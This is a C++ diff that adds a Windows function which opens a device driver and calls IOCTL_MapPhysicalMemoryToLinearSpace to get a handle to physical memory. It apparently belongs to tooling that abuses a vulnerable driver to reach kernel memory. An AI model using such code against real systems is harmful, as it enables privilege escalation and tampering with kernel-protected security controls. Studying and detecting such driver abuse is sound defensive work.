@@ -62,3 +62,43 @@ NTSTATUS UnmapPhysicalMemory(Phys32Struct& phys32) {
 
 	return status;
 }
+
+HANDLE GetDevicePhysicalMemoryHandle(LPCWSTR driverName) {
+	HANDLE device = INVALID_HANDLE_VALUE;
+	NTSTATUS status = FALSE;
+	DWORD bytesReturned = 0;
+	HANDLE hPhysicalMemory = { 0 };
+
+
+	device = CreateFileW(driverName, GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
+
+	if (device == INVALID_HANDLE_VALUE)
+	{
+		fprintf(stderr, "> Could not open device: 0x%X\n", GetLastError());
+		CloseHandle(device);
+		return NULL;
+	}
+
+	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
+	status = DeviceIoControl(device,
+		IOCTL_MapPhysicalMemoryToLinearSpace,
+		&hPhysicalMemory,
+		sizeof(hPhysicalMemory),
+		&hPhysicalMemory,
+		sizeof(hPhysicalMemory),
+		&bytesReturned,
+		(LPOVERLAPPED)NULL);
+
+	if (status == FALSE) {
+		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
+		CloseHandle(device);
+		return nullptr;
+	}
+
+
+	printf("[*] IOCTL_MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", IOCTL_MapPhysicalMemoryToLinearSpace);
+	printf("[*] Buffer from the kernel land: %p", hPhysicalMemory);
+	CloseHandle(device);
+
+	return hPhysicalMemory;
+}
